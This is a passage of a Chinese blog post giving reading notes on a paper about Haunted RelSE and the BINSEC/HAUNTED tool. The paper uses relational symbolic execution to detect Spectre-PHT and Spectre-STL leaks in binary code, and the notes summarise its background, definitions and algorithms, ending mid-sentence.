    <content type="html"><![CDATA[<p>鬼！</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><p>本校在毕设之前还有个“小毕设”——<code>网络空间安全综合实验</code> ，刚好笔者要做的题目是基于这篇论文完成的，所以还是简单写一个阅读笔记：）</p><blockquote><p>说是笔记，其实还是差不多相当于把原文翻译了一遍（（（</p></blockquote><h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p><strong>Spectre</strong> 是一种微架构层面的漏洞，其允许攻击者利用推测执行（speculation executino）技术中的漏洞来泄露信息，但对于该类型漏洞的检测面临着两个挑战：①推测路径带来的搜索空间爆炸②在不同编译阶段引入的 Spectre 漏洞</p><p>本文提出了在二进制级的 Spectre 漏洞的量化检测的优化方法：<code>Haunted RelSE</code>，并证明了相比于在最先进的工具中的更朴素的显式推测执行方法（more naive explicit speculative execution approach），该优化是语义正确的</p><p>研究者在一个符号分析工具中应用了 <code>Haunted RelSE</code> ，并在一个有名的 Spectre-PHT（Spectre v1） 的 litmus tester 上进行了测试，并打算在一个新的 Spectre-STL（Spectre v4）的 litmus tester 上测试</p><blockquote><p>litmus test：对内存一致性的测试</p><blockquote><p>好像没有啥中文翻译，相关的中文资料也少，摸了</p></blockquote></blockquote><p>该技术比最先进的工具发现了更多的 violations 与 scales，并让研究者发现：对 Spectre-PHT 的标准防护手段 <code>index-masking</code> 与著名的编译  <em>位置无关的可执行文件</em>  （position independent executables）的 gcc 选项，导致了 Spectre-STL 的引入</p><p>研究者提出并验证了一种对 <code>index-masking</code> 的修正方法</p><h1 id="0x01-INTRODUCTION"><a href="#0x01-INTRODUCTION" class="headerlink" title="0x01. INTRODUCTION"></a>0x01. INTRODUCTION</h1><p>现代 CPU 的执行速度依赖于包括分支预测器（branch predictor）与 <em>投机</em> （ <em>speculation</em> ）在内的复杂硬件逻辑：提前执行指令 &amp; 尝试通过分支预测器来推测执行（speculatively execute）一条控制流，若推测失败则恢复被影响区域——称为  <em>恢复执行</em> （Reverted execution，也叫做 <em>瞬态执行</em> （transient execution），意为从架构角度来看这个操作是透明的）</p><p>但瞬态执行会在微架构级（microarchitecture）留下可观测的侧面影响（side effects），而这可以被攻击者用以恢复架构级（architectural）的秘密——这种攻击手法称之为<strong>幽灵攻击</strong>（Spectre attacks）</p><p>幽灵有着<a href="https://transient.fail/">多种变种</a>，但绝大部分的工作都仅关注于  <code>Spectre-v1</code> （Pattern History Table，对条件分支的攻击），仅有 <a href="https://arxiv.org/pdf/1910.01755.pdf">Pitchfork</a> 做了 <code>Spectre-v4</code> （Store to Load，对内存屏障预测器的攻击）的相关工作，但并不完善</p><h4 id="Goal-and-Challenge"><a href="#Goal-and-Challenge" class="headerlink" title="Goal and Challenge"></a>Goal and Challenge</h4><p>本篇论文中研究者提出了一种用以检测 <code>Spectre-PHT</code> 与 <code>Spectre-STL</code> 漏洞的方法，并应用于静态二进制代码分析中，这面临着两个挑战：</p><ul><li><strong>C1</strong>：微架构的细节在分析中无法被完全获得，需要一种足够强大的提取方法以提取造成侧信道攻击的微架构状态（mocroarchitectural state）</li><li><strong>C2</strong>：对可能的推测执行的探索的规模不能太大，否则会造成状态爆炸（state explosion）</li></ul><h4 id="Proposal"><a href="#Proposal" class="headerlink" title="Proposal"></a>Proposal</h4><p>本文通过在文献中创造的  <em>关系安全属性</em>  （relational security property）作为  <em>推测常数时间</em>  （speculative constant-time）来应对挑战 C1。推测常数时间在没有详细建模复杂的微架构细节的情况下将推测执行纳入考虑，但编译器没必要保护常数时间编程（constant-time programming），故我们的分析在二进制层操作（无需源码）。本文将前人的模型扩展到常数时间二进制分析上，以分析  <em>推测常数时间</em>  </p><p><strong>符号执行</strong>（symbolic execution）是一项在二进制代码上扩展良好的技术，但为了分析推测常数时间，其必须考虑程序的推测行为。Spectre-PHT 与 Spectre-STL 的符号分析者通过 fork 以探索临时路径，从而对推测性行为进行 <em>清晰地</em>  （explicitly）建模，而这导致了状态爆炸——尤其是对 Spectre-STL 而言。对符号执行的常数时间样式（constant-time-like）的属性的改造，称为  <em>关系符号执行</em>  （relational symbolic execution， RelSE），在二进制层面的可伸缩性与精度上已被证明是非常成功的</p><p>为了解决 C2，本文的核心技术是利用 RelSE 来  <em>在同一时间</em> 像常规执行（即，与正确的推测相关的执行） 那样执行临时的执行；本文将这种技术命名为 <code>Haunted RelSE</code>：</p><ul><li>对于 Spectre-PHT，其通过同时执行由条件语句产生的瞬态的与常规的路径以对多余状态进行剪枝</li><li>对于 Spectre-STL，其对多余状态进行剪枝并将剩余部分编码在一个单独的符号路径中，而非为每个可能的加载与存储交叉将符号执行进行分支</li></ul><p>本文在一个二进制层的关系符号分析工具 BINSEC&#x2F;HAUNTED 中应用 Haunted RelSE，为了进行评估，本文使用了 Spectre-PHT 的著名测试用例 Kocher ，以及一组为 Spectre-STL 提出的新测试用例，以及来自 donna、Libsodium 与 OpenSSL 库的真实世界密码学代码</p><p><strong>Findings.</strong> 本文的工作展示了一种用于对抗 Spectre-PHT 的著名防御手段 index-masking 可能会引入新的 Spectre-STL 漏洞，并提出且验证了用以解决这个问题的安全实现，通过本文的工具还发现了 GCC 中一个流行的用以生成位置无关代码（position-independent code）的选项可能引入 Spectre-STL 漏洞，同时还确认了由编译器添加的栈保护在密码原语（cryptographic primitives）中引入了 Spectre violations</p><p><strong>Contributions.</strong> 总结起来本文的工作就是：</p><ul><li>研究者设计了一种基于关系符号执行的技术，称之为 <code>Haunted Relse</code>，用以在符号分析中高效地分析推测执行，以检测 PHT 与 STL Spectre（Section III &amp; IV）；<code>Haunted Relse</code> 的基本思想是同时基于常规的与瞬态的行为进行符号化推断，尽管研究者对内存的编码让人联想到一些状态合并的编码，但实际上其遵循了不同的理论，通过防止常规与瞬态执行之间的人工阻断，而非试图将不同的路径（可能不相关）打包在一起；研究者正式证明了显式地对所有的推测路径建模进行关系分析与使用 Haunted Relse 在语义上等价（Section IV）</li><li>研究者提出了一种名为 <code>BINSEC/HAUNTED</code> 的验证工具，实现了 <code>Haunted Relse</code>，并通过著名的用于 spectre-PHT 的 litmus test 进行评估；研究者还进一步地提出一组用于 Spectre-STL 的 litmus test 且用其测试了 <code>BINSEC/HAUNTED</code>；试验的评估显示了 <code>BINSEC/HAUNTED</code> 可以在如 OpenSSL、donna、Libsodium 这样的真实世界的密码学代码中发现推测常数时间漏洞；对于 Spectre-PHT，<code>BINSEC/HAUNTED</code> 最多可以分析 5k 条静态指令，并比现有水平的  KLEESpectre 与 Pitchfork 更快（但精准度更低）；对于 Spectre-STL，其可以最多分析 100 条指令并在高达 6k 条指令的代码中找到漏洞；相比于 Pitchfork，<code>BINSEC/HAUNTED</code> 明显更快，且能找到更多的漏洞并报告更多的不安全程序</li><li>据研究者所知，其第一个报告了著名的用于对抗 Spectre-PHT 的防护 <code>index-masking</code> 有可能引入 Spectre-STL 漏洞；研究者提出了用以修复这个问题的正确实现（Section VI），并用其工具进行了验证；研究者同时还第一个报告了 GCC 编译器的 PIC 选项引入了 Spectre-STL 漏洞（Section VI）</li></ul><p><strong>Discussion.</strong> 当 Spectre attacks 开启了系统安全的新战场，对推测执行的思考变得困难且冗长，这需要自动搜索技术，但由于额外的推测行为引起的路径爆炸，此前的提案都存在可扩展性问题，<code>Haunted RelSE</code> 是向着可扩展的对 Spectre attacks 的分析迈出的一步；对于 Spectre-PHT，Haunted RelSE 可以在一些情况下提高分析速度，对分析推测语义的复杂性进行剪枝，并缩放于中等大小的真实世界中的密码学二进制文件；对于 Spectre-STL，其为第一个可以彻底分析小的真实世界密码学二进制文件的工具，并能在中等大小的真实世界密码学二进制文件中找到漏洞</p><h1 id="0x02-BACKGROUND"><a href="#0x02-BACKGROUND" class="headerlink" title="0x02. BACKGROUND"></a>0x02. BACKGROUND</h1><p>本节研究者提供了关于 Spectre 的基本背景：推测常数时间（speculative constant-time）与关系符号执行（relational symbolic execution）</p><p><strong>Spectre attacks.</strong> 在现代处理器中，只要指令的操作数可用，其被按顺序获取并存放在一个 <em>重排序缓冲区</em> （reorder buffer）中，且能按任意顺序执行；处理器同时使用<strong>推测</strong>（speculation）机制以在特定指令执行之前预测其输出，由误判带来的指令流——即 <em>瞬态执行</em> （transient execution）会被在架构级还原（例如恢复寄存器的值），但这可能遗留微架构级的侧面影响（例如 cache 的状态可能不会被恢复），而这些微架构级的侧面影响对程序是透明的，这使得攻击者可以进行侧信道攻击，<strong>幽灵攻击</strong>（Spectre attacks） 便是利用这种推测机制来触发这样的会在微架构级存储秘密数据的瞬态执行——称之为 <code>spectre gadgets</code>，这将被通过侧信道攻击进行复原</p><p>幽灵攻击一共有四种根据针对的机制的不同变种：</p><ul><li><code>Spectre-PHT</code>：对用以预测条件分支的 <code>Pattern History Table</code> 进行利用</li><li><code>Spectre-BHB</code>：对用以预测分支地址的 <code>Branch Target Buffer </code>进行利用</li><li><code>Spectre-RSB</code>：对用以预测返回地址的 <code>Return Stack Buffer </code>进行利用</li><li><code>Spectre-STL</code>：对用以预测 <code>Store-To-Load dependencies</code> 的消歧义机制进行利用</li></ul><p>对 BTB 与 RSB 变种的推测机制，可能会被误认为任意地址跳转，这对静态分析而言比较棘手（参见 Section VII），故研究者主要关注 Spectre-PHT 与 Spectre-STL</p><p><strong>Spectre-PHT.</strong> <code>Pattern History Table</code> 用以在微架构级预测条件分支的输出；我们首先介绍 Spectre 的变种 1，攻击者滥用分支预测器以故意在一个分支进行错误的推测；即使程序中的条件语句在架构级确保了内存访问的范围固定，攻击者可以引导 PHT 错误预测一个分支的值以瞬态执行一个越界内存访问，这在缓存中留下可以被观测到的且能被用以恢复越界读的数据的影响（Listing 1）</p><p><img src="https://s2.loli.net/2023/01/25/WZD6Vx1YTv3koiG.png" alt="Listing 1: Illustration of a Spectre-PHT attack."></p><p><strong>Spectre-STL.</strong> <code>Store-To-Load dependencies</code> 需要在所有的 store 指令完成执行前 load 指令不会执行，为了让 CPU 瞬态执行 store 指令并避免缓存未命中导致的暂停，store 指令以队列形式存放在一个 <code>store buffer</code> 中，而相较于等待先前的 store 指令完成，load 指令可以直接从匹配的带有 <em>store-to-load forwarding</em> 的 <code>store buffer </code> 中取值；此外，当内存消歧义器（memory disambiguator）预测到一个 load指令并非等待中的 store 的别名，其可以 <em>推测性地绕过在 store buffer 中等待中的 store</em> 并直接从主存取值；Spectre-STL 利用这种行为来载入会被编码于缓存中的包含秘密数据的旧值（Listing 2）</p><p><img src="https://s2.loli.net/2023/01/25/r7wLWqOlckJHzbK.png" alt="Listing 2: Illustration of a Spectre-STL attack."></p><p><strong>Speculative constant-time</strong>（SCT）. 常数时间（constant time）是密码学代码中一个流行的编程规范：程序不会存储、装载秘密数据值或是以其进行分支，以避免侧信道数据泄露；然而常数时间并不足以预防幽灵攻击，如 Listing 1 为一个常规的没有对秘密数据的访问或以其分支的常数时间程序，但该程序存在 Spectre-PHT 漏洞，攻击者可以误导式训练分支预测器并在瞬态执行中泄露秘密数据；推测常数时间是最近的一个扩展常数时间以考虑瞬态执行的安全属性</p><p><strong>Definition 1</strong>（Speculative constant-time）. 当且仅当一个程序的每一对（推测）执行有着相同的公共输入并协定了推测决策、且互相的控制流与内存访问都相等时，该程序关于推测常数时间是安全的。</p><p>需要注意的是 SCT（类似于常数时间与其他信息流属性）并非一个执行轨迹的属性，而与两个执行轨迹相关联，因此需要近似工具以高效地建模轨迹对</p><p><strong>Binary-level symbolic execution.</strong> 符号执行（Symbolic Execution）即使用符号输入执行程序，其会构建一个称为 <em>路径谓语</em> （path predicate）的逻辑表达式，用以保存在执行过程中遇到的分支条件；为了确认一条路径是否能通，路径谓语会被交给可满足性模理论求解器（SMT solver）进行求解；符号执行同时还能检查断言以寻找漏洞或是进行有界验证（即，在一个确定的深度下进行验证）</p><p>分析二进制代码通常采用将代码指令解码为一种低级的中间语言的形式，在二进制级的符号执行中的值（如寄存器、内存地址、内存内容等）为固定大小的符号位向量，内存被表示为一个用 32 位的位向量表示地址的符号字节数组，一个符号数组为一个通过如下操作将每个下标 <code>i ∈ I</code> 映射到对应值 <code>v ∈ V</code> 的函数（<code>Array I V</code>）：</p><ul><li><code>select</code>：<code>(Array I V) × I → V</code> 获取一个数组 <code>a</code> 与一个下标 <code>i</code>，返回一个存储在数组 <code>a</code> 的下标 <code>i</code> 的值 <code>v</code></li><li><code>store</code>：<code>(Array I V) × I × V → (Array I V)</code>  获取一个数组 <code>a</code> 、一个下标 <code>i</code> 与一个值 <code>v</code>，返回将下标 <code>i</code> 映射到值 <code>v</code> 的数组 <code>a</code></li></ul><p><strong>Relational Symbolic Execution.</strong> <code>关系符号执行</code>（RelSE）是一种有前景的将符号执行进行扩展以分析如 SCT 这样的两个执行路径的安全属性的方法，其符号化地在相同的符号执行实例中执行一个程序的两个版本并在其之间最大化共有部分；以分析常数时间为例，RelSE 让两个程序 <em>共享相同的公有输入</em> （public input），但使用不同的 <em>秘密输入</em>  （secret input），并在执行过程中检查是否条件分支的输出与内存下标在两个执行中必须一致——这代表其是否决定于秘密</p><p>在 RelSE 中，变量被映射到 <em>关系表达式</em> （relational expression）中，当其可能依赖于秘密数据时，其为一对符号表达式（表示为 <code>&lt;ϕl | ϕr&gt;</code> ），否则为一个简单的符号表达式（表示为 <code>&lt;ϕ&gt;</code> ）；为了对内存访问与条件指令进行安全评估，研究者使用如下定义的函数 <code>secLeak</code> 以确保一个关系表达式并不决定于秘密（即，表达式左右内容必须相等）：</p><p><img src="https://s2.loli.net/2023/01/27/mAty1adqCrk49UV.png" alt="image.png"></p><p><code>|=</code> 表示可满足（反之表示不满足），其依赖于这样一个事实：若 $\widehat{\varphi}$ 为一个简单的表达式，参照定义，其并不依赖于秘密，因而可以被安全地泄露；然而若 $\widehat{\varphi}$  为一对表达式  <code>&lt;ϕl | ϕr&gt;</code> ，仅当 <code>ϕl</code> 与 <code>ϕr</code> 在当前路径谓语 <code>π</code> 下不可被确认时（即表达式 <code>π ∧ ϕl ≠ ϕr</code> 不可被满足），泄露才是安全的</p><p><strong>Notations.</strong> 大小为 <code>n</code> 的符号位向量的集合表示为 <em>Bv<sub>n</sub></em> ，符号表达式（位向量或数组）  <em>ϕ, ϕl , ϕr, ψ, . . .</em>  的集合表示为 <code>Φ</code> ，关系表达式 $\widehat{\varphi}$，$\widehat{\psi}$, . . . 的集合表示为 <strong>Φ</strong> ， $\widehat{\varphi}$ 左、右的值表示为  $\widehat{\varphi _{|l}}$ 、$\widehat{\varphi _{|r}}$ ，若$\widehat{\varphi} &#x3D; \langle \varphi \rangle$ ，则  $\widehat{\varphi _{|l}}$ 、$\widehat{\varphi _{|r}}$ 都被定义为  $\widehat{\varphi}$ ，符号数组上的函数 <code>select</code> 与 <code>store</code> 的关系表达式为：</p><p><img src="https://s2.loli.net/2023/01/27/HVZc2jtCybDEUQh.png" alt="image.png"></p><h1 id="0x03-HAUNTED-RELSE"><a href="#0x03-HAUNTED-RELSE" class="headerlink" title="0x03. HAUNTED RELSE"></a>0x03. HAUNTED RELSE</h1><p>为了分析 SCT，我们需要修改 RelSE 以考虑程序的推测语义（speculative semantics），这包括 <em>常规表达式</em> ——被作为一个好的推测结果而执行的且会在推测被解决时保存的指令——以及所有可能的 <em>瞬态执行</em> ——被作为误测且会在推测解决时被丢弃的指令；本节描述解决这个问题的方法——在最新的工具中使用（参见 Table V）——研究者称之为 <em>Explicit</em> ，因为其直接建模了瞬态执行，并展现了研究者的优化探索策略，称之为 <em>Haunted</em></p><h3 id="A-Spectre-PHT"><a href="#A-Spectre-PHT" class="headerlink" title="A. Spectre-PHT"></a>A. Spectre-PHT</h3><p><em>1）Explicit RelSE for Spectre-PHT</em> ： <em>Explicit</em> 尝试通过符号执行建模 Spectre-PHT——于 KLEESpectre 中引入——通过将每个条件分支分成四个路径来直接地建模了瞬态执行；例如 <code>Fig.1a</code> 中的程序与 <code>Fig.1b</code> 中的该程序的符号执行树，在条件指令 <strong>if</strong> <code>c1</code> 后，执行将分成四个路径：</p><ul><li>两个 <em>常规路径</em> （regular path）：如同标准符号执行一般，第一个路径跟着 <code>then</code> 分支并将约束 <code>(c1 == true)</code> 添加到路径谓语中，第二条路径跟着 <code>else</code> 分支并将约束 <code>(c1 == false)</code> 添加到路径谓语中</li><li>两个 <em>瞬态路径</em> （transient path）：为了统计被误判到 <code>true</code> 的瞬态执行，<code>then</code> 分支被以约束 <code>(c1 == false)</code> 执行，为了统计被误判到 <code>false</code> 的瞬态执行，<code>else</code> 分支被以约束 <code>(c1 == true)</code> 执行；这些瞬态路径会在达到 <em>推测边界</em> （speculation bound，通常由重排序缓冲区的大小决定）后被丢弃</li></ul><p>为了验证 SCT，我们需要确认内存访问与条件状态是否在常规路径与瞬态路径上都没有泄露秘密信息；在常规路径上我们要确认程序的 <em>控制流</em> 与 <em>load 和 store 指令的下标</em> 并不决定于秘密输入，然而在瞬态路径上我们仅确认  <em>控制流</em> 与 <em>load 和 store 指令的下标</em>  ，因为在推测执行中，内存的 store 操作为 store buffer 中的队列，直到过期之前对缓存都不可见</p><p><em>Problem with Explicit</em> ：对于 <code>Fig. 1b</code>，我们看到两条子树都为常规执行与瞬态执行 <code>then</code> 分支的结果（即 子树起始于状态 <code>A</code> ），对应于不同路径谓语下的相同指令，准确地说，若我们将 $\widehat{\psi _{cf} }$ 、$\widehat{\psi _{ld} }$ 、$\widehat{\psi <em>{st}}$ 称为子树 <code>A</code> 中对应的 <em>控制流状态、 load 下标、store 下标</em> 的关系表达式，则对于常规执行我们需要检查 $seckeak(\pi \and c</em>{1},\widehat{\psi <em>{cf}}) \and seckeak(\pi \and c</em>{1},\widehat{\psi <em>{ld}}) \and seckeak(\pi \and c</em>{1},\widehat{\psi <em>{st}})$  ，对于瞬态执行我们需要检查 $seckeak(\pi \and \neg c</em>{1},\widehat{\psi <em>{cf}}) \and seckeak(\pi \and \neg c</em>{1},\widehat{\psi _{ld}})$；最终等价于检查如下表达式：</p><p>$$<br>seckeak(\pi,\widehat{\psi _{cf}}) \and seckeak(\pi,\widehat{\psi <em>{ld}}) \and seckeak(\pi \and c</em>{1},\widehat{\psi _{st}})<br>$$</p><p>该表达式基本近似于在没有约束 <code>c1</code> 的情况下符号化地执行 <code>then</code> 分支至 $\delta$，检查 load 的下标 $\widehat{\psi _{ld} }$ 与控制流表达式 $\widehat{\psi _{cf} }$，仅将 <code>c1</code> 添加到 store 下标 $\widehat{\psi _{st} }$ 的检查中</p><p><em>这样的发现让研究者设计出来 Explicit RelSE 的优化方法：探索一个单独的同时包含程序的常规与瞬态行为的推测路径，以在保存一个等价结果的同时对状态进行剪枝</em></p><p><em>2）Haunted RelSE for Spectre-PHT</em>  ：相较于将执行分为四个路径，Haunted RelSE 仅将其分为两个路径，如 <code>Fig. 1c</code> 所示，在条件分支 <strong>if</strong> <code>c1</code> 之后，执行将分为两个路径：一个路径跟随 <code>then</code> 分支（子树 <code>A</code>），另一路径跟随 <code>else</code> 分支（子树 <code>B</code>），两个分支都同时对常规与相应的瞬态路径的行为进行建模；此外，其会延迟（可能免去）对路径约束的检查——仅会添加约束 $c _{1} \or \neg c _{1}$ ；最终，约束将会在条件分支失效后（在  $\delta$ 步后）被添加到路径谓语中</p><p>在每个条件状态 （或是 load 指令），研究者会检查条件（或是 load 下标）在常规执行与瞬态执行中都不依赖于秘密（即，使用路径谓语 π）：$seckeak(\pi,\widehat{\psi _{cf}}) \and seckeak(\pi,\widehat{\psi _{ld}})$ ；另一方面，store 指令仅会在常规执行下被检查（即，使用路径谓语 $\pi \and c _{1}$）；最终，条件 $(c1 &#x3D;&#x3D; true)$ 会被在  $\delta$ 步后被添加到路径谓语中</p><p><img src="https://s2.loli.net/2023/01/27/ba8tRJLwo6IzSnq.png" alt="Figure 1: Comparison of RelSE of program in Fig. 1a, where solid paths represent regular executions, dotted paths represent transient executions, and δ is the speculation depth."></p><h3 id="B-Spectre-STL"><a href="#B-Spectre-STL" class="headerlink" title="B.Spectre-STL"></a>B.Spectre-STL</h3><p><em>1) Explicit RelSE for Spectre-STL</em> ：在微架构级别，一个 load 指令可以从 store buffer 的任意匹配的 entry 或是从主存获取其值，这意味着 load 可以绕过 store buffer 中未决的 store 操作直到达到主存；为了统计这一行为， <em>Explicit</em> 策略——应用于 PITCHFORK 中——通过为每个可能的 load 与 store 交错进行符号执行分支以直接建模瞬态执行</p><p>考虑 <code>Fig.2a</code> 中的程序，对于 store 指令的符号执行给出 <code>Fig. 2b </code> 中定义的符号化内存 $\mu _{3}$，其为从 <code>initial_memory</code> 开始的一系列符号化 store 操作；有了这样按时间顺序的表示，我们可以很容易地用符号化内存中的最后 <code>|SB|</code> 次 store 操作来定义一个大小为 <code>|SB|</code> 的 store buffer；类似的，主存也可以通过移除符号化内存中的最后 <code>|SB|</code> 次 store 操作进行定义；以一个大小为 2 的 store buffer 为例，当主存由 $\mu _{1}$ 定义时，最后两次 store 构成了 store buffer</p><p>第一条 load 指令（block <code>A</code>）可以绕过 store buffer 中的每一个 store 操作直到其达到主存，因此 <code>x</code> 有三种可能的值，如 <code>Fig. 2c</code> 所示：</p><ul><li>常规值 $r$ 对应一个最近的符号化内存 $\mu _{3}$ 的符号化的 $select$ 操作，因为所有先前的 store 操作都被按顺序编码进了 $\mu _{3}$ ，这对应着顺序执行</li><li>第一个瞬态值 $t _{2}$ 通过绕过 store buffer 中的第一个 entry 而获得，这对应着 $\mu _{2}$ 中的一个符号化 $select$ 操作</li><li>最后一个瞬态值 $t _{1}$​ 通过绕过 store buffer 中的第一与第二个 entry 并从主存取值而获得，这对应着 $\mu _{1}$ 中的一个符号化 $select$ 操作</li></ul><p>类似地，变量 <code>y</code> 同样有三种可能的取值</p><p>如 <code>Fig. 2d </code> 中所示的 <em>Explicit</em> 探索策略为 load 的每个能获取的可能的值进行符号执行分支，这将很快导致路径爆炸，我们通过实验表明（Section V-C）即便是在较少代码上（100条指令）这个问题也很难解决</p><p><em>2) Haunted RelSE for Spectre-STL</em> ：研究者首先观察到大部分路径都是多余的，一个 load 可以通过先前的非别名 store 进行代偿，考虑 <code>Fig. 2c </code>中的评估，若我们能够确认 load 的下标 $a$ 与第二个 store 的下标 $a _{2}$ 不同，根据数组的定义，我们有 $t _{2} &#x3D; t _{1}$ ，由此路径 $x \to t _{2}$ 与其所有的子路径都是多余的； <em>研究者基于一种著名的称之为 read-over-write 的对符号数组的优化来检测与剪枝多余的情况</em> （cases）</p><p>然而，对多余情况的合并并不足以解决路径爆炸（参见 Section V），由此 <em>研究者提出一种新的编码以在一个单独的路径谓语中保存剩下的情况</em> ，其使用符号化的 <em>if-then-else</em> 来在一个单独的表示中编码所有可能被 load 取的值，而非为每个可能的情况进行分支执行</p><p>例如 <code>Fig. 2c</code> 中对 load 表达式的评估，在对第二个 load 的评估之后，变量 $y$ 可以取值 $r’,t’<em>{1},t’</em>{2}$，研究者引入两个新的布尔变量 $b’ <em>{1}$ 与 $b’ <em>{2}$ 并构建表达式 $(ite\ b’</em>{1}t’</em>{1}(ite\ b’<em>{2}t’</em>{2}r’))$，求解器可以让 $y$ 取如下值：</p><ul><li>瞬态值 $t’<em>{1}$ ，通过将 $b’</em>{1}$ 设为 true</li><li>瞬态值 $t’<em>{2}$ ，通过将 $b’</em>{1}$ 设为 false 且 $b’_{2}$ 设为 true</li><li>常规值 $r$，通过将 $b’<em>{1}$ 与 $b’</em>{2}$ 都设为 false</li></ul><p>最后，瞬态值  $t’<em>{1}$ （或是  $t’</em>{2}$） 可以简单地通过将  $b’<em>{1}$ （或是 $b’</em>{2}$）设为 false 来丢弃 </p><p><img src="https://s2.loli.net/2023/01/27/LK3SeluXqFkg5mb.png" alt="Figure 2: Speculative RelSE of program in Fig. 2a. The symbolic memory is given in Fig. 2b and the symbolic evaluation of load instructions is detailed in Fig. 2c. Figure 2d illustrates the symbolic execution tree obtained from the Explicit exploration strategy; and Fig. 2e, the tree obtained from Haunted RelSE, where solid paths denote regular executions and dotted paths denote transient executions."></p><h1 id="0x04-IMPLEMENTATION-OF-HAUNTED-RELSE"><a href="#0x04-IMPLEMENTATION-OF-HAUNTED-RELSE" class="headerlink" title="0x04. IMPLEMENTATION OF HAUNTED RELSE"></a>0x04. IMPLEMENTATION OF HAUNTED RELSE</h1><p>本节介绍 Haunted RelSE 的技术细节，主要关注于用以分析 SCT 的二进制级的 RelSE 的变化</p><p>由于对数据的依赖项的存在，大部分指令自然地执行或是不能被重排序，其实对于 Spectre-PHT 我们只需要考虑对条件分支的重排序（Section IV-A）并对 Spectre-STL 重排序 load 与 store 即可（Section IV-B）</p><p>一个表示为 $\sigma $ 的符号配置（symbolic configuration）由以下组成：</p><ul><li>当前位置 $l$ ，用以获取程序 $P$ 中的当前指令 $P[l]$</li><li>符号执行  $\delta $  的当前深度</li><li>一个符号寄存器映射 $\rho$ ，将程序变量映射到对应的符号值</li><li>两个路径谓语 $\pi$ 与 $\widetilde{\pi}$ （具体参见 Section IV-A）</li><li>一个符号化内存 $\widehat{\mu}$——一对符号数组、其 store 操作的 <em>过期深度</em> （retirement depth）</li><li>一组瞬态的 load $\widetilde{\lambda}$ （具体参见 Section IV-B）</li></ul><p>记号 $\sigma.f$ 表示配置 $\sigma$ 中的字段 $f$，研究者还定义了一个函数 $eval_expr(\sigma ,e)$ 用以在符号配置  $\sigma $  中计算一个 DBA 表达式 $e$ 到一个符号值</p><p>相比于直接对重排序缓冲区进行建模，研究者使用符号执行的 <em>当前深度</em> （current depth）来追踪要失效（retired）的指令，一条指令在至多 ∆ 步之后必须要退出，其中 ∆ 为重排序缓冲区的大小；表达式被附注了一个深度以确认其是否要退出，或是其是否依赖于内存，例如寄存器映射 $\rho$ 中的一个变量 $v$ 映射到一对 $(\widehat{\psi},\delta)$ ，其中 $\delta$ 为最近内存访问的失效深度（retirement depth），当 $\delta$ 不需要在上下文中时，其便被省略掉了</p><h3 id="A-Haunted-RelSE-for-Spectre-PHT"><a href="#A-Haunted-RelSE-for-Spectre-PHT" class="headerlink" title="A. Haunted RelSE for Spectre-PHT"></a>A. Haunted RelSE for Spectre-PHT</h3><p><em>1) Evaluation of conditional instructions</em> ：与标准的符号执行不同，条件并不会被立刻加入到路径谓语中，而是会与其退出深度一起被保存在一个 <em>推测路径谓语</em> （speculative path predicate） $\widetilde{\pi}$ 中；当达到一个条件的失效深度时，其会被从推测路径谓语中移除，添加到 <em>失效路径谓语</em> （retired path predicate） $\pi$ 中</p><p>对条件分支的评估如 <code>Algorithm 1</code> 所示，函数首先会评估条件的符号值并确认其可以被安全地泄露，之后其通过更新位置与推测路径谓语  $\widetilde{\pi}$  以沿着分支 <code>then</code>  计算后续状态 $\sigma _{t}$ 、沿着分支 <code>else</code> 计算后续状态 $\sigma _{f}$ </p><p><img src="https://s2.loli.net/2023/01/27/eAi2Hs3fFEqlK4w.png" alt="image.png"></p><p><em>2) Determining speculation depth</em> ：一个条件分支后的推测路径是动态计算的，考虑当其所依赖的所有内存访问都失效时，一个条件可以被完全解出（且预测错误的路径可以被去除），这意味着若该条件并不依赖于内存，则分支并未预测错误</p><p>这需要为每个表达式保存其最后内存访问的深度，如 <code>Algorithm 1</code> 所示，在一个条件分支上， $ite\ c\ ?l <em>{true}:l</em>{false}$ 被计算为一个符号值 $\widehat{\varphi}$ 与深度 $\delta$ ，该深度 $\delta$ 被作为条件的退出深度而添加到推测路径谓语  $\widetilde{\pi}$  中</p><p><em>3) Invalidate transient paths</em> ：在 <code>Algorithm 2</code> 中，条件分支在函数 $retirePHT(\pi,\widetilde{\pi},\delta)$ 中失效，该函数从推测路径谓语 $\widetilde{\pi}$ 中移除所有带有小于当前深度 $\delta _{current}$ 的失效深度 $\delta _{ret}$ 的条件，并将其添加到失效路径谓语 $\pi$ 中，并返回更新后的路径谓语  $\pi$ 与 $\widetilde{\pi}$ ；若  $\pi$ 不可满足，则符号执行将停止</p><p><img src="https://s2.loli.net/2023/01/27/tl29pvOeFdrBTGj.png" alt="image.png"></p><h3 id="B-Haunted-RelSE-for-Spectre-STL"><a href="#B-Haunted-RelSE-for-Spectre-STL" class="headerlink" title="B. Haunted RelSE for Spectre-STL"></a>B. Haunted RelSE for Spectre-STL</h3><p><em>1) Symbolic memory</em> ：在一个符号配置中，内存 $\widehat{\mu}$ 为从初始内存开始的符号化 store 操作的历史，我们可以使用这个按时间顺序的表示来重新构造 <em>store buffer</em> 与 <em>main memory</em> 的内容；store buffer 也是对符号化内存的最后 <code>|SB|</code> 条未失效 store 的限制，其中 <code>|SB|</code> 为 store buffer 的大小，形式上其被定义为：</p><p><img src="https://s2.loli.net/2023/01/27/Xt352nyMkC8R6vO.png" alt="image.png"></p><p>其中 $last(n,\widehat{\mu})$ 为符号化内存 $\widehat{\mu}$ 的最后 $n$ 个元素</p><p>类似地， <em>主存</em> （main memory）被定义为符号化内存堆失效的 store 操作的限制，形式上定义为 $Mem(\widehat{\mu},\delta)\triangleq\widehat{\mu}\backslash SB(\widehat{\mu},\delta)$</p><p>对一个 store 指令的评估如 <code>Algorithm 3</code> 所示，首先该函数会计算下标的符号值并确认其可以在 <em>常规路径谓语</em> $\pi _{reg}$ 下被安全地泄露（即，失效路径谓语 $\pi$ 与所有 $\widetilde{\pi}$ 中的未决的条件的结合，加上 $\lambda$ 中失效的 transient loads ），接下来其使用一个符号化的 store 操作来更新符号化内存并将该 store 的失效深度设为 $\delta + \Delta$，该失效深度用以确认 store buffer 中的哪一个 store 操作在等待中、哪一个已作用于主存上</p><p><img src="https://s2.loli.net/2023/01/28/HnTcajkiSudZODv.png" alt="image.png"></p><p><em>2) Evaluation of load expressions</em> ：load 表达式可以通过 <em>store-to-load forwarding</em> 从 store 